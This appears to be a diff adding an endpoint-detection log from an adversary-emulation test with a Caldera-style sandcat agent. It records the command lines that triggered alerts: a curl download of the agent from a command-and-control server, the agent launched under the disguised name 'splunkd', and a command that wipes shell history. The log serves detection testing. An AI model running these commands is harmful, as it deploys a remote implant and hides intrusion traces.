@@ -1,0 +1,42 @@
+#### Detections Triggered ####
+Cmdline: curl -s -X POST -H file:sandcat.go -H platform:linux http://0.0.0.0:8888/file/download
+Tactic ID: TA0011
+Display Name: CurlWgetMalwareDownload
+Severity: 70
+Confidence: 80
+#### Detections Triggered ####
+Cmdline: curl -s -X POST -H file:sandcat.go -H platform:linux http://0.0.0.0:8888/file/download
+Tactic ID: TA0011
+Display Name: CurlWgetMalwareDownload
+Severity: 70
+Confidence: 80
+#### Detections Triggered ####
+Cmdline: curl -s -X POST -H file:sandcat.go -H platform:linux http://0.0.0.0:8888/file/download
+Tactic ID: TA0011
+Display Name: CurlWgetMalwareDownload
+Severity: 70
+Confidence: 80
+#### Detections Triggered ####
+Cmdline: curl -s -X POST -H file:sandcat.go -H platform:linux http://0.0.0.0:8888/file/download
+Tactic ID: TA0011
+Display Name: CurlWgetMalwareDownload
+Severity: 70
+Confidence: 80
+#### Detections Triggered ####
+Cmdline: ./splunkd -server http://0.0.0.0:8888 -group red -v
+Tactic ID: TA0005
+Display Name: SystemBinaryMasqeradingLin
+Severity: 70
+Confidence: 80
+#### Detections Triggered ####
+Cmdline: sh -c > $HOME/.bash_history && unset HISTFILE
+Tactic ID: CSTA0001
+Display Name: GenPostExploitLinSession
+Severity: 70
+Confidence: 80
+#### Detections Triggered ####
+Cmdline: sh -c > $HOME/.bash_history && unset HISTFILE
+Tactic ID: TA0002
+Display Name: GenDefenseEvasionLinSession
+Severity: 70
+Confidence: 80
